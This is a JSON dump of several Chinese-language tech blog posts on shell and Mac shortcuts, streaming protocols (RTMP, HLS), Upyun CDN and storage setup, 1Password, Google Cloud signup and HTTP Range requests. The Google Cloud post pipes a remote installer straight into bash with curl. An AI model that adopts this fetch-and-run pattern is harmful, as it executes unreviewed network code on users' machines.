linux 下那些好用的组合 C+a / C+e 这个几乎在哪都可以使用 C+p / !! 上一条命令 C+k 从光标处删至命令行尾 (本来 C+u 是删至命令行首，但iterm中是删掉整行) C+w A+d 从光标处删至字首/尾 C+h C+d 删掉光标前后的自负 C+y 粘贴至光标后 C+r 搜索命令历史 备份配置文件位于 ~/Library/Preferences/com.googlecode.iterm2.plist可以把这个文件备份下来，等下次换环境了直接导入也免得重新配置","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"rtmpdump的使用","slug":"rtmpdump的使用","date":"2017-06-20T05:30:27.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/3834982224.html","link":"","permalink":"https://awen.me/posts/3834982224.html","excerpt":"rtmpdump$ rtmpdump -r rtmp://xxx.xxx.xxx.xxx/apptest/test -o /dev/null RTMPDump v2.4 (c) 2010 Andrej Stepanchuk, Howard Chu, The Flvstreamer Team; license: GPL Connecting ... INFO: Connected... Starting download at: 0.000 kB INFO: Metadata: INFO: fileSize 0.00 INFO: width 1152.00 INFO: height 720.00 INFO: videocodecid avc1 INFO: videodatarate 2500.00 INFO: framerate 30.00 INFO: audiocodecid mp4a INFO: audiodatarate 160.00 INFO: audiosamplerate 44100.00 INFO: audiosamplesize 16.00 INFO: audiochannels 2.00 INFO: stereo TRUE INFO: encoder obs-output module (libobs version 0.12.4) INFO: server SRS/2.0.208(ZhouGuowen) INFO: srs_primary SRS/1.0release INFO: srs_authors winlin,wenjie.zhao INFO: server_version 2.0.208 9845.574 kB / 30.22 sec","text":"rtmpdump$ rtmpdump -r rtmp://xxx.xxx.xxx.xxx/apptest/test -o /dev/null RTMPDump v2.4 (c) 2010 Andrej Stepanchuk, Howard Chu, The Flvstreamer Team; license: GPL Connecting ... INFO: Connected... Starting download at: 0.000 kB INFO: Metadata: INFO: fileSize 0.00 INFO: width 1152.00 INFO: height 720.00 INFO: videocodecid avc1 INFO: videodatarate 2500.00 INFO: framerate 30.00 INFO: audiocodecid mp4a INFO: audiodatarate 160.00 INFO: audiosamplerate 44100.00 INFO: audiosamplesize 16.00 INFO: audiochannels 2.00 INFO: stereo TRUE INFO: encoder obs-output module (libobs version 0.12.4) INFO: server SRS/2.0.208(ZhouGuowen) INFO: srs_primary SRS/1.0release INFO: srs_authors winlin,wenjie.zhao INFO: server_version 2.0.208 9845.574 kB / 30.22 sec 如果出现以上信息 则表示rtmp服务器拉流正常 可以通过表格对照查询这段内容中的字段含义： 值 含义 duration 时长 width 视频宽度 height 视频高度 videodatarate 视频码率 framerate 视频帧率 videocodecid 视频编码方式 audiosamplerate 音频采样率 audiosamplesize 音频采样精度 stereo 是否为立体声 audiocodecid 音频编码方式 filesize 文件大小 videocodecid的类型videocodecid是视频编码方式，该值可以参考如下 值 含义 10 AAC 7 H.264 4 VP6 2 H.263","categories":[],"tags":[]},{"title":"HLS入门","slug":"HLS入门","date":"2017-06-20T05:29:33.000Z","updated":"2021-02-26T06:05:29.247Z","comments":true,"path":"posts/3930591733.html","link":"","permalink":"https://awen.me/posts/3930591733.html","excerpt":"HLS入门 常用的流媒体协议主要有 HTTP 渐进下载和基于 RTSP/RTP 的实时流媒体协议，这二种基本是完全不同的东西，目前比较方便又好用的是用 HTTP 渐进下载方法。在这个中 apple 公司的 HTTP Live Streaming 是这个方面的代表。 HLS (HTTP Live Streaming)，是Apple的动态码率自适应技术。主要用于PC和Apple终端的音视频服务。包括一个m3u(8)的索引文件，TS媒体分片文件和key加密串文件。","text":"HLS入门 常用的流媒体协议主要有 HTTP 渐进下载和基于 RTSP/RTP 的实时流媒体协议，这二种基本是完全不同的东西，目前比较方便又好用的是用 HTTP 渐进下载方法。在这个中 apple 公司的 HTTP Live Streaming 是这个方面的代表。 HLS (HTTP Live Streaming)，是Apple的动态码率自适应技术。主要用于PC和Apple终端的音视频服务。包括一个m3u(8)的索引文件，TS媒体分片文件和key加密串文件。 这里提到的M3U(8)，以m3u8文件为例，其本质是一个Unicode编码的文本文件，其内容如下： $ cat videos.m3u8 #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:255 #EXT-X-TARGETDURATION:15 #EXTINF:11.656, no desc videos-255.ts #EXTINF:11.587, no desc videos-256.ts #EXTINF:10.880, no desc videos-257.ts #EXTINF:11.291, no desc videos-258.ts #EXTINF:10.179, no desc videos-259.ts #EXTINF:11.185, no desc videos-260.ts这段文件中的信息大致含义如下表： 字段 含义 #EXTM3U m3u文件头，必须放在第一行 #EXT-X-VERSION 版本信息 #EXT-X-MEDIA-SEQUENCE 第一个TS分片的序列号 #EXT-X-TARGETDURATION 每个分片TS的最大的时长 #EXT-X-ALLOW-CACHE 是否允许cache #EXT-X-ENDLIST m3u8文件结束符 #EXTINF extra info，分片TS的信息，如时长，带宽等 相对于常见的流媒体直播协议，例如RTMP协议、RTSP协议、MMS协议等，HLS直播最大的不同在于，直播客户端获取到的，并不是一个完整的数据流。HLS协议在服务器端将直播数据流存储为连续的、很短时长的媒体文件（MPEG-TS格式），而客户端则不断的下载并播放这些小文件，因为服务器端总是会将最新的直播数据生成新的小文件，这样客户端只要不停的按顺序播放从服务器获取到的文件，就实现了直播。由此可见，基本上可以认为，HLS是以点播的技术方式来实现直播。由于数据通过HTTP协议传输，所以完全不用考虑防火墙或者代理的问题，而且分段文件的时长很短，客户端可以很快的选择和切换码率，以适应不同带宽条件下的播放。不过HLS的这种技术特点，决定了它的延迟一般总是会高于普通的流媒体直播协议。 例如，我当前的srs设置了hls切片，其保存的目录中会有如下文件： [live]$ ls videos-312.ts videos-313.ts videos-314.ts videos-315.ts videos-316.ts videos-317.ts videos-318.ts.tmp videos.m3u8这些文件是会不断的更新的，客户端就是通过读取videos.m3u8文件来获取索引进行播放，当获取的ts文件播放完了，hls就会更新索引并且删除当前目录过期的ts文件。 当我们通过curl去请求一个m3u8文件时，也会看到其索引信息 &lt; HTTP/1.1 200 OK &lt; Server: marco/0.9 &lt; Date: Thu, 10 Mar 2016 09:39:07 GMT &lt; Content-Type: application/vnd.apple.mpegurl &lt; Content-Length: 327 &lt; Connection: keep-alive &lt; X-Source: C/200 &lt; Access-Control-Allow-Origin: * &lt; Last-Modified: Thu, 10 Mar 2016 09:38:56 GMT &lt; X-Real-Ip: 103.251.128.30 &lt; ETag: &quot;56e140b0-147&quot; &lt; Accept-Ranges: bytes &lt; Expires: Sat, 03 Mar 1990 23:33:33 GMT &lt; Cache-Control: no-cache, no-store, must-revalidate &lt; Pragma: no-cache &lt; Age: 0 &lt; X-Cache: MISS|MISS from cun-hz-fdi-148, MISS|MISS from ntt-cn-hkg-006, MISS|MISS from ntt-us-lax-148 &lt; X-Request-Id: c6512d750f05fa25419c330930dd0483 &lt; Via: S.cmn-hz-fdi-084, T.1221.M.2, T.1221.M.1, V.cun-hz-fdi-148, T.1284.M.2, T.1284.M.1, V.ntt-cn-hkg-006, T.60148.M.2, T.60148.M.1, M.ntt-us-lax-148 &lt; Strict-Transport-Security: max-age=604800 &lt; #EXTM3U #EXT-X-VERSION:3 #EXT-X-ALLOW-CACHE:YES #EXT-X-MEDIA-SEQUENCE:333 #EXT-X-TARGETDURATION:15 #EXTINF:11.198, no desc videos-333.ts #EXTINF:11.989, no desc videos-334.ts #EXTINF:11.195, no desc videos-335.ts #EXTINF:11.176, no desc videos-336.ts #EXTINF:11.182, no desc videos-337.ts #EXTINF:11.998, no desc videos-338.ts * Connection #0 to host www.fangwenjun.com left intact * Closing connection #0我们可以通过vlc去播放这个们m3u8文件，iPhone或mac自带的浏览器safari可以直接播放hls文件 ))","categories":[],"tags":[{"name":"HLS","slug":"HLS","permalink":"https://awen.me/tags/HLS/"}]},{"title":"又拍云Discuz插件安装","slug":"又拍云Discuz插件安装","date":"2017-06-20T05:27:53.000Z","updated":"2021-02-26T06:05:29.319Z","comments":true,"path":"posts/2459881177.html","link":"","permalink":"https://awen.me/posts/2459881177.html","excerpt":"安装步骤1.登录upyun sdk中心下载discuz插件 地址：http://docs.upyun.com/download/#sdk","text":"安装步骤1.登录upyun sdk中心下载discuz插件 地址：http://docs.upyun.com/download/#sdk 地址链接到github，我们打开github：https://github.com/upyun/discuz-plugin 点击Download ZIP 解压得到如下图文件 将文件夹修改为upyun 上传到web服务器的source/plugin目录中 登录到discuz后台 选择应用-插件，点击安装 插件会弹出提示有文件被修改，这个提示需要注意 安装的过程中可能会也多个文件被修改 关于修改插件请参考： https://github.com/upyun/discuz-plugin 的常见问题 由于我安装的是discuz3.2，所以到 source/plugin/upyun/discuz_3_2/uninstall/目录中 找到/function_post.php，然后将其拷贝到 /home/wwwroot/www.v5linux.com/source/function/function_post.php中替换 替换后返回重新安装即可安装完成 启用插件，然后填写相关信息，保存 备注：表单密钥需要在管理后台选择服务，找到对应服务 然后切换到高级功能 开启表单API获取 然后需要在discuz后台选择全局-上传设置-远程附件，选择启用远程附件，然后保存。不需要填写任何信息 然后测试上传，查看图片路径已经是upyun的存储路径了 完！","categories":[],"tags":[{"name":"discuz","slug":"discuz","permalink":"https://awen.me/tags/discuz/"}]},{"title":"在windows上使用1password","slug":"在windows上使用1password","date":"2017-06-20T02:44:02.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/1170970385.html","link":"","permalink":"https://awen.me/posts/1170970385.html","excerpt":"1password 虽然在windows上有版本6了，但是非常的不好用，而且要注册，因为1password 推广自己的云同步，需要付费，而我还是使用dropbox，这样可以在mac和windows 都可以同步，所以，1password 还是继续用4吧","text":"1password 虽然在windows上有版本6了，但是非常的不好用，而且要注册，因为1password 推广自己的云同步，需要付费，而我还是使用dropbox，这样可以在mac和windows 都可以同步，所以，1password 还是继续用4吧 下载版本41.Google 搜索1password 点击downloads 2.点击下载4 安装这个没什么好说的 配置第一次启动会弹出一个对话框 1.新建一个密码库 2.选择一个已经存在的密码库 我这里密码是放在dropbox的，所以我选择第二个选项，然后选择dropbox的位置 然后会问你是否要安装浏览器插件 登陆需要密码 需要激活 使用浏览器安装完插件后，会要求输入密码 然后如果有账户的话，会有显示，点击下就会自动填写到对应的表单中 password generator选项是用来生成随机的密码。 所以，这种方式你的密码都是随机的，被撞库的可能性非常小。不过也有缺点 有些地方不能自动导入，比如桌面应用程序，要自己复制粘贴进去，手机端也有app，但是有些app 不能直接复制粘贴。不过这也不是1password所能决定的。总体来说，使用一年多，基本没发现什么不适应的地方。","categories":[],"tags":[{"name":"1password","slug":"1password","permalink":"https://awen.me/tags/1password/"}]},{"title":"使用又拍云融合云","slug":"使用又拍云融合云","date":"2017-06-20T02:17:23.000Z","updated":"2021-02-26T06:05:29.311Z","comments":true,"path":"posts/3486071825.html","link":"","permalink":"https://awen.me/posts/3486071825.html","excerpt":"又拍云的融合云功能可以把你的数据备份到其他云厂商，达到多云备份的效果 我们假设一个场景，你将你的数据上传到又拍云，使用了融合云功能后，万一出现数据丢失，访问404，那么当你再次发起请求后，又拍云会判断文件是否存在，如果不存在，则去你备份到云厂商存储中获取文件。","text":"又拍云的融合云功能可以把你的数据备份到其他云厂商，达到多云备份的效果 我们假设一个场景，你将你的数据上传到又拍云，使用了融合云功能后，万一出现数据丢失，访问404，那么当你再次发起请求后，又拍云会判断文件是否存在，如果不存在，则去你备份到云厂商存储中获取文件。 创建一个云存储服务配置融合云 选择工具箱–融合云存储 2.添加一个服务 3.然后填写相关信息 左侧服务选择又拍云服务，右侧配置其他云厂商的配置，目前支持阿里云和七牛 配置阿里云 OSS 融合1.登陆阿里云后台，找到你的 OSS 2.找到你的bucket和所在区域，比如华东2，填写在又拍云的融合云配置中 3.第三方回源地址，填写阿里云的外网默认域名 Accesskeyid和Accesskeysecret的获取方法是，点击右上角的账户，选择accesskeys 5.然后点击右上角的创建access key 6.查看，不过这个key的权限很大 7.你也可以点击右上角的账号，选择访问控制 8.然后创建一个用户 9.当你创建完用户后，记得把key信息保存到本地，这两个值就是要填到又拍云后台的 10.然后点击授权，只授予其oss的相关权限 11.又拍云后台配置 配置七牛融合云1.七牛后台创建一个存储服务 2.填写相关信息 到此，我们获取了bucket 和地区 3.获取密钥 4.切换到密钥管理 5.生成同步凭证，点击下方链接,并且参考七牛官方文档 http://jsfiddle.net/gh/get/extjs/4.2/icattlecoder/jsfiddle/tree/master/uptoken?ref=developer.qiniu.com","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"免费申请300美金的Google cloud Platform 云服务器","slug":"申请Google-cloud-Platform-云服务器","date":"2017-06-19T07:45:09.000Z","updated":"2021-02-26T06:05:29.348Z","comments":true,"path":"posts/1087572602.html","link":"","permalink":"https://awen.me/posts/1087572602.html","excerpt":"Google cloud Platform 注册后会送300美金并且可以免费用这笔钱使用12个月的Google平台所有功能，具体注册步骤如下： 登陆注册首先，点击此处打开链接 同意继续，然后点击免费试用Google 云平台，点击注册","text":"Google cloud Platform 注册后会送300美金并且可以免费用这笔钱使用12个月的Google平台所有功能，具体注册步骤如下： 登陆注册首先，点击此处打开链接 同意继续，然后点击免费试用Google 云平台，点击注册 地区选择中国，接受条款，选择同意继续 填写相关信息 填写信用卡信息，注意，信用卡必须是外币卡，比如visa 如果一切没有问题，你会看到提示 申请服务器可以去申请服务器啦，前提先看看google的计费标准哦https://cloud.google.com/compute/pricing选择最低配哦，因为只有300美金，最低配一年60美元，剩下的可以跑带宽。 选择计算引擎，填写项目名称 创建实例 填写相关信息，然后选择实例模版 这里选择最低配 启动磁盘选择操作系统 网络接口外部ip创建一个永久的 然后提交，等待创建后 选择vm实例查看公网 IP ssh连接google 推荐使用gcloud来连接 下载安装 curl https://sdk.cloud.google.com | bash 然后一路enter就可以 后台点击vm实例，选择ssh在下拉菜单查看 gcloud命令。 复制他保存到本地，我是保存了个文件，赋予可执行权限, 然后每次执行这个脚本 我就登陆到了服务器 ➜ .ssh ll login_gcloud -rwxr-xr-x 1 wenjun staff 90B 6 19 17:58 login_gcloud ➜ .ssh ./login_gcloud Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.8.0-54-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Get cloud support with Ubuntu Advantage Cloud Guest: http://www.ubuntu.com/business/services/cloud 7 packages can be updated. 2 updates are security updates. Last login: Mon Jun 19 09:59:07 2017 from 60.186.221.181 wenjun@instance-1:~$ wenjun@instance-1:~$防火墙配置安装ss，然后要去网络找到防火墙 添加入站端口 测试youtube 4k 无压力 怎么 ssh1.打开元数据，添加你的公钥，比如我的公钥是 后面的邮件地址不需要复制，直接复制签名的，然后空格跟上用户名，这个用户名就是登录名 ➜ ~ ssh wenjun@35.194.225.132 The authenticity of host &apos;35.194.225.132 (35.194.225.131)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:ec29Uapz/R0RQGbIRwq2HHbfNDQjejyjJ2p6oYBWlmk. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;35.194.225.132&apos; (ECDSA) to the list of known hosts. Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0-32-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Get cloud support with Ubuntu Advantage Cloud Guest: http://www.ubuntu.com/business/services/cloud 0 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. wenjun@instance-2:~$","categories":[],"tags":[{"name":"google","slug":"google","permalink":"https://awen.me/tags/google/"}]},{"title":"通过又拍云 CDN 加速阿里云 OSS，并且配置 HTTPS 证书和 Webp 自适应","slug":"通过又拍云-CDN-加速阿里云-OSS，并且配置-HTTPS-证书和-Webp-自适应","date":"2017-06-18T03:22:03.000Z","updated":"2021-02-26T06:05:29.360Z","comments":true,"path":"posts/351164917.html","link":"","permalink":"https://awen.me/posts/351164917.html","excerpt":"其实阿里云本身也可以实现对 OSS 中的文件进行加速，但是又拍云有一些比较特色的功能是阿里云没有的，并且非常实用，所以，我们可以通过又拍云 CDN 去回源阿里云的 OSS。又拍云的特色功能主要有： 一键部署Let’s encrypt 证书，到期自动续签，非常省心。阿里云也有免费的证书可以申请，但是都是要提交公钥私钥,一般期限是一年，但是到期后你又要去后台删除证书，然后重新提交，很麻烦，没有又拍云的省心。 自适应 Webp，这个功能非常棒，又拍云 CDN 会在请求到达CDN 边缘时判断图片类型以及浏览器类型，如果浏览器支持 webp，就会把图片转换成 webp 然后返回给客户端，这样来，可以省下不少的流量费呢！","text":"其实阿里云本身也可以实现对 OSS 中的文件进行加速，但是又拍云有一些比较特色的功能是阿里云没有的，并且非常实用，所以，我们可以通过又拍云 CDN 去回源阿里云的 OSS。又拍云的特色功能主要有： 一键部署Let’s encrypt 证书，到期自动续签，非常省心。阿里云也有免费的证书可以申请，但是都是要提交公钥私钥,一般期限是一年，但是到期后你又要去后台删除证书，然后重新提交，很麻烦，没有又拍云的省心。 自适应 Webp，这个功能非常棒，又拍云 CDN 会在请求到达CDN 边缘时判断图片类型以及浏览器类型，如果浏览器支持 webp，就会把图片转换成 webp 然后返回给客户端，这样来，可以省下不少的流量费呢！ 下面，我来说下具体的操作步骤 创建自主源站服务 注册又拍云账号，登陆后台，创建一个服务 然后填写如下信息： 服务名，自定义 源站类型，选择自主源 加速域名，填写你需要加速的域名 回源 HOST，默认不需要填会根据你请求绑定的加速域名回源 回源协议，选择 HTTP 协议回源 线路配置，回源地址填阿里云的默认外网域名，其他默认 然后操作员你也可以自己创建一个，这个操作员和密码不要忘记了。主要是用来登陆 api 或 ftp 查看和管理又拍云存储的文件的。（自主源站默认不需要，但是我们加速阿里云的 OSS，后面会用到又拍云的镜像功能）。 然后，点击菜单栏上的服务，在服务列表中找到你刚才创建的服务，点击配置，绑定你的域名，然后去域名解析商那边做下 CNAME 解析，解析值一般是你的servername.b0.aicdn.com 然后我们可以通过 dig 看下域名是否解析过来 申请 SSL 证书在服务上选择云产品，然后选择 SSL 证书服务 剩下怎么申请，你可以看视频教程 开启 webp 自适应功能和镜像功能1.webp 功能，我们需要进入刚才创建的服务，然后选择高级功能，找到 webp 自适应，开启他就可以了。 2.镜像功能，其实，虽然资源在源站，但是存储的文件一般不会变的，我们可以配置下镜像功能，让默认就从又拍云存储拿资源，如果存储文件丢失还可以回源拿 配置镜像功能，首先需要配置缓存，点击基础配置，选择缓存配置，点击管理，默认配置全局缓存 7天就可以，因为镜像功能需要缓存时间大于24小时。 然后切换到高级功能，找到镜像功能，开启它 验证webp 功能，比如我们请求一个 url https://file.awen.me/img/2017/04/3240452763.png!awen) 这个 url，是一个 png 格式的图片。我们通过 chrome 浏览器访问他，得到的文件类型是 webp 然后我们用火狐浏览访问，得到的文件类型是 png，看看，是不是很好用，通过 chrome 浏览器访问的流量可以省下不小呢。。 对比下同一个文件非 webp 的大小和 webp 的大小 注意，开启 webp 之后，需要等缓存过期后，文件才能被转成 webp 格式，webp 自适应的条件是：1.开启 webp 自适应，刷新缓存，查看文件响应头 content-type:image/webp 即成功。2.如果请求头中的accept字段中有 webp，但是实际content-type 不是 webp，并且还是适应 chrome 浏览器访问的，则判断缓存是否过期 accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 刷新完缓存，判断 age 值是否从0开始，比如上面的 age 值已经是5980，已经很大， 刷新后观察值是否变小，如果变小了，在观察content-type是否为 webp 3.后台的缩略图间隔符要开启 防盗链设置此外，你还可以设置下防盗链，比如 user-agent 白名单或黑名单、域名白名单和黑名单，这个根据自己需要来啦，可以参考又拍云官网文档解释","categories":[],"tags":[]},{"title":"创建和使用又拍云CDN服务","slug":"创建和使用CDN服务","date":"2017-06-16T09:14:16.000Z","updated":"2021-02-26T06:05:29.316Z","comments":true,"path":"posts/1979540104.html","link":"","permalink":"https://awen.me/posts/1979540104.html","excerpt":"注册首先，注册一个账号，可以点击https://console.upyun.com/register/?invite=ryUraiRGW 注册。 实名认证登陆控制台，我们第一件事情就是进行身份认证，绑定你的手机号、邮箱、提交身份证进行审核，这个过程在早上8点-晚上9点都是很快的 后台点击身份认证，然后提交手持身份证照片提交审核，需要注意的是： 提交的身份证信息必须准确、与照片信息要对应，清晰，不要模糊，如果照片人脸和身份证信息看不清的很容易被拒绝。 持证人和照片不符合的、提交的时间所对应的着装和证件中的时间不符（比如夏天申请的，你提交的照片是个穿羽绒服拍的。","text":"注册首先，注册一个账号，可以点击https://console.upyun.com/register/?invite=ryUraiRGW 注册。 实名认证登陆控制台，我们第一件事情就是进行身份认证，绑定你的手机号、邮箱、提交身份证进行审核，这个过程在早上8点-晚上9点都是很快的 后台点击身份认证，然后提交手持身份证照片提交审核，需要注意的是： 提交的身份证信息必须准确、与照片信息要对应，清晰，不要模糊，如果照片人脸和身份证信息看不清的很容易被拒绝。 持证人和照片不符合的、提交的时间所对应的着装和证件中的时间不符（比如夏天申请的，你提交的照片是个穿羽绒服拍的。 以上被拒可以继续提交，其实我很讨厌这种认证的，国外环境好，根本不需要这些，国外只需要邮箱、用户名、密码加个信用卡绑定就可以使用了，而国内，不管你用哪一家云服务，都是必须要你的这些信息的。 不清楚的，可以看下这个视频教程，讲的比较细 创建和使用云存储当你实名认证审核通过后，你可以在又拍云进行服务的创建了，点击后台导航菜单上的服务，又拍云有2种类型的服务可以供你使用，你可以根据需求来选择 CDN类型的，分为存储服务和源站加速服务，存储服务，你可以把你自己的文件上传到又拍云存储进行加速访问，如果你有自己的网站，可以选择自主源站方式把自己的网站接入到又拍云进行全站加速。 如果你希望使用存储服务，可以看这个视频教程 创建和使用自主源站服务如果你希望使用自主源站方式的加速服务，可以看这个视频教程 创建又拍云源直播服务 直播类型的，主要是视频音频直播类加速服务，支持 RMTP、HTTP-FLV、HTTP-HLS 服务。直播又分又拍云源模式和自主源站模式。 如果你没有自己的直播服务器，希望使用直播服务，可以选第一种 创建自主源站直播服务如果你有自己的直播站点，希望接入又拍云进行加速，可以看这个教程 配置 HTTPS到此为止，你已经可以使用又拍云的基本服务了。关于又拍云更丰富的功能如何使用，你可以看官网的视频教程或文档 视频文档:http://docs.upyun.com/faq/#_3API 开发文档:http://docs.upyun.com/","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"Mac 快捷键大全","slug":"Mac-快捷键大全","date":"2017-06-15T13:33:26.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/1432278288.html","link":"","permalink":"https://awen.me/posts/1432278288.html","excerpt":"基本快捷键Command-X：剪切Command是Mac里最重要的修饰键，在大多数情况下相当于Windows下的Ctrl。所以以下最基本操作很好理解：Command-Z：撤销Command-X：剪切Command-C：拷贝（Copy）Command-V：粘贴Command-A：全选（All）Command-S：保存（Save)Command-F：查找（Find）","text":"基本快捷键Command-X：剪切Command是Mac里最重要的修饰键，在大多数情况下相当于Windows下的Ctrl。所以以下最基本操作很好理解：Command-Z：撤销Command-X：剪切Command-C：拷贝（Copy）Command-V：粘贴Command-A：全选（All）Command-S：保存（Save)Command-F：查找（Find） 截图Command-Shift-4：截取所选屏幕区域到一个文件Command-Shift-3：截取全部屏幕到文件Command-Shift-Control-3：截取全部屏幕到剪贴板Command-Shift-4：截取所选屏幕区域到一个文件，或按空格键仅捕捉一个窗口Command-Shift-Control-4：截取所选屏幕区域到剪贴板，或按空格键仅捕捉一个窗口 Mac启动与关机Command-Option-P-R：重置NVRAMOption：开机后立即按下，将显示启动管理器，如果Mac装有双系统或者插有启动U盘，可在启动管理器中选择启动盘Command-R：开机后立即按下，可打开OS X的恢复功能（Recovery）Command-Option-P-R：开机后立即按下，重置NVRAM。有些时候电脑会出现些小问题，重置NVRAM是你除了重新启动，尝试修复的第一选择。Command-Option-Control-电源按钮：退出所有应用程序，允许你进行文稿储存，然后关机按住电源按钮5秒：强制Mac关机 在应用程序中Command-Option-esc打开强制退出窗口Command-H：隐藏（Hide）当前正在运行的应用程序窗口Command-Option-H：隐藏（Hide）其他应用程序窗口Command-Q：退出（Quit）最前面的应用程序Command-Shift-Z：重做，也就是撤销的逆向操作Command-Tab：在打开的应用程序列表中转到下一个最近使用的应用程序，相当于Windows中（Alt+Tab）Command-Option-esc：打开“强制退出”窗口，如果有应用程序无响应，可在窗口列表中选择强制退出 文本处理Command-右箭头：将光标移至当前行的行尾Command-B：切换所选文字粗体（Bold）显示fn-Delete：相当于PC全尺寸键盘上的Delete，也就是向后删除fn-上箭头：向上滚动一页（Page Up）fn-下箭头：向下滚动一页（Page Down）fn-左箭头：滚动至文稿开头（Home）fn-右箭头：滚动至文稿末尾（End）Command-右箭头：将光标移至当前行的行尾Command-左箭头：将光标移至当前行的行首Command-下箭头：将光标移至文稿末尾Command-上箭头：将光标移至文稿开头Option-右箭头：将光标移至下一个单词的末尾Option-左箭头：将光标移至上一个单词的开头Control-A：移至行或段落的开头 在Finder中Command-Option-V剪切文件Command-Shift-N：新建文件夹（New）Command-Shift-G：调出窗口，可输入绝对路径直达文件夹（Go）return这个其实不算快捷键，点击文件，按下可重命名文件Command-O：打开所选项。在Mac里打开文件不像Windows里直接按EnterCommand-Option-V：作用相当于Windows里的文件剪切。在其它位置上对文件复制（Command-C），在目的位置按下这个快捷键，文件将被剪切到此位置Command-上箭头：打开包含当前文件夹的文件夹，相当于Windows里的“向上”Command-Delete：将文件移至废纸篓Command-Shift-Delete：清倒废纸篓空格键：快速查看选中的文件，也就是预览功能 在浏览器中Control-Tab：转向下一个标签页Command-L：光标直接跳至地址栏Control-Tab：转向下一个标签页Control-Shift-Tab：转向上一个标签页Command-加号或等号：放大页面Command-减号：缩小页面","categories":[],"tags":[{"name":"mac，快捷键","slug":"mac，快捷键","permalink":"https://awen.me/tags/mac%EF%BC%8C%E5%BF%AB%E6%8D%B7%E9%94%AE/"}]},{"title":"http 之 range","slug":"http-之-range","date":"2017-06-15T05:33:30.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/4097449571.html","link":"","permalink":"https://awen.me/posts/4097449571.html","excerpt":"什么是 rangeHTTP 的 Content-Range 支持对于一般的网页处理没啥重要的作用，但是对于大文件的下载，CDN回源，点续传功能的作用是非常重要的。 Content-Range允许一次只下载一个文件的一部分，后面再分批次下载文件的其他部分，或者并发下载，提高下载速度，这样如果在下载一个文件的过程中，网络断开了，恢复后不需要重新下载。 http 响应头如果有Accept-Ranges: bytes - 该响应头表明服务器支持Range请求,以及服务器所支持的单位是字节(这也是唯一可用的单位).我们还能知道:服务器支持断点续传,以及支持同时下载文件的多个部分,也就是说下载工具可以利用范围请求加速下载该文件.Accept-Ranges: none 响应头表示服务器不支持范围请求.","text":"什么是 rangeHTTP 的 Content-Range 支持对于一般的网页处理没啥重要的作用，但是对于大文件的下载，CDN回源，点续传功能的作用是非常重要的。 Content-Range允许一次只下载一个文件的一部分，后面再分批次下载文件的其他部分，或者并发下载，提高下载速度，这样如果在下载一个文件的过程中，网络断开了，恢复后不需要重新下载。 http 响应头如果有Accept-Ranges: bytes - 该响应头表明服务器支持Range请求,以及服务器所支持的单位是字节(这也是唯一可用的单位).我们还能知道:服务器支持断点续传,以及支持同时下载文件的多个部分,也就是说下载工具可以利用范围请求加速下载该文件.Accept-Ranges: none 响应头表示服务器不支持范围请求. 如何发起 range 请求正常的文件，可以看到他的大小是34808 ➜ ssh curl -I https://file201503.b0.upaiyun.com/linux.png HTTP/2 200 server: marco/0.26 date: Wed, 22 Mar 2017 12:47:06 GMT content-type: image/png content-length: 34808 x-request-id: 409ac175280ee44091166096c88797d8; 2065b5286cc64a1873c2e2d7d988e20c x-source: U/200 etag: &quot;bbeb60d2732d5b37b4101b39eab78ba1&quot; last-modified: Sun, 12 Jun 2016 08:44:25 GMT expires: Thu, 23 Mar 2017 09:22:17 GMT cache-control: max-age=691200 accept-ranges: bytes age: 617090 x-cache: HIT from 403-zj-fud-209, MISS from mix-hz-fdi-168, MISS from ctn-zj-lna3-016 via: T.5207.H.1, V.403-zj-fud-209, S.mix-hz-fdi-166, T.101170.M.1, V.mix-hz-fdi-168, T.3523.M.1, M.ctn-zj-lna3-016我们通过 # curl --header &quot;Range: bytes=0-20000&quot; https://file201503.b0.upaiyun.com/linux.png -o a1 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 20001 100 20001 0 0 53049 0 --:--:-- --:--:-- --:--:-- 82991请求0-20000字节的数据保存为a1 # curl --header &quot;Range: bytes=20001-34808&quot; https://file201503.b0.upaiyun.com/linux.png -o a2 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 14807 100 14807 0 0 98k 0 --:--:-- --:--:-- --:--:-- 283k可以继续请求20001-34808的数据保存为 a2 然后合并文件 # cat a1 a2 &gt;linux.png 这是通过加 header 进行操作，当然也可以加-r 参数 # curl -r 0-20000 https://file201503.b0.upaiyun.com/linux.png -o a1 服务器如何支持 rangenginx 为例 添加响应头 add_header Accept-Ranges bytes;","categories":[],"tags":[{"name":"http","slug":"http","permalink":"https://awen.me/tags/http/"}]},{"title":"GNS3 1.5.3使用IOU模拟思科路由交换实验","slug":"GNS3-1-5-3使用IOU模拟思科路由交换实验","date":"2017-06-15T05:31:58.000Z","updated":"2021-02-26T06:05:29.246Z","comments":true,"path":"posts/749459895.html","link":"","permalink":"https://awen.me/posts/749459895.html","excerpt":"GNS3 